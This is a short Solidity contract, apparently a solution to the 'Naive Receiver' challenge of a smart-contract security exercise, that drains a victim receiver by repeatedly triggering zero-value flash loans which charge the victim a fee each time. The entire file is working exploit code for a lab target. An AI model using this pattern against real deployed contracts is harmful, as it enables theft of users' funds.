import "../naive-receiver/NaiveReceiverLenderPool.sol";

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address owner;

    constructor(address payable _pool, address _owner) {
        pool = NaiveReceiverLenderPool(_pool);
        owner = _owner;
    }

    function attack(address victim) public {
        require(msg.sender == owner, "only owner can attack");
        for (int i=0; i < 10; i++ ) {
            pool.flashLoan(IERC3156FlashBorrower(victim), ETH, 0 ether, "");
        }
    }
}
